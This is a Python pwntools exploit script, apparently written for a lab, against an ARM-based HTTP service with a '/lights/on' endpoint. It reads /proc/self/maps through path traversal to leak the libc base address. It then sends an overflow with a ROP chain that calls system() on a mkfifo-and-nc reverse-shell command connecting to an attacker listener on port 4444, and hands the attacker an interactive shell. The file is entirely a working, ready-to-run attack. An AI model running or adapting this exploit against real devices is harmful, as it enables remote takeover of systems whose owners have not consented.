#!/usr/bin/env python

from pwn import *
from time import sleep

LHOST = '192.168.150.100'
LPORT = 4444
RHOST = '192.168.150.128'
RPORT = 8080
BAD_CHARS = '\x00\x20'

#CMD = 'telnetd %d' % LPORT
CMD = 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc %s %i >/tmp/f' % (LHOST,LPORT)
CMD = CMD.replace(' ', '\t') + ';#'

libc_offset = 0x40000000
s = remote(RHOST, RPORT)
s.send('GET ../../../proc/self/maps HTTP/1.1\r\n\r\n')
while s.can_recv(1):
  line = s.recvline()
  if 'libc.so' in line and 'r-x' in line:
    libc_offset = int(line.split('-')[0], 16)
    info('Found libc offset at: 0x%x' % libc_offset)
    break
s.close()

pc = cyclic_find('auoa')
sp = cyclic_find('aupa')

info('PC offset: %d; SP offset: %d' % (pc, sp))

buffer = 'S' * (sp - (0xcc + len(CMD)))
buffer += CMD
buffer += 'T' * (pc - (len(buffer) + 20))
buffer += 'R4R4'
buffer += 'R5R5'
buffer += 'R6R6'
buffer += 'R7R7'
buffer += 'R8R8'

# Overwrite PC and LR with pop {pc}
buffer += p32(libc_offset + 0x0002139c)    # pop {pc};

# r0 = *cmd
buffer += p32(libc_offset + 0x0005a447)    # THUMB: pop {r3, pc};
buffer += p32(libc_offset + 0x0002139c)    # pop {pc};
buffer += p32(libc_offset + 0x000437ac)    # add r1, sp, #7; mov r0, r4; blx r3;
buffer += p32(libc_offset + 0x0005a447)    # THUMB: pop {r3, pc};
buffer += p32(0xffffffd3)                  # -45
buffer += p32(libc_offset + 0x0004aacc)    # pop {r0, r4, lr}; bx lr;
buffer += 'r0r0r4r4'
buffer += p32(libc_offset + 0x0002139c)    # pop {pc};
buffer += p32(libc_offset + 0x00058c8c)    # sub r1, r1, r3; bx lr;
buffer += p32(libc_offset + 0x00051778)    # mov r0, r1; bx lr;

# call system --> 0x000109c8 <system@plt> 0x01020AC9 - 0x01010101 = 0x109c8
buffer += p32(libc_offset + 0x0005a067)    # THUMB: pop {r1, r3, pc}; 
buffer += p32(0x01020AC9)
buffer += p32(0x01010101)
buffer += p32(libc_offset + 0x00058c8c)    # sub r1, r1, r3; bx lr; 
buffer += p32(libc_offset + 0x00043850)    # blx r1; 
#buffer += 'PWNT'
buffer += CMD

for c in BAD_CHARS:
  if c in buffer:
     warning('Found char %x in buffer at index %d' % (ord(c), buffer.index(c)))

s = remote(RHOST, RPORT)
nc = listen(LPORT)
info('Sending payload to target.')
s.send('GET /' + buffer + '/lights/on HTTP/1.1\r\n\r\nHost: XXXXXXXX\r\n\r\n')

nc.wait_for_connection()
nc.interactive()
s.close()
nc.close()

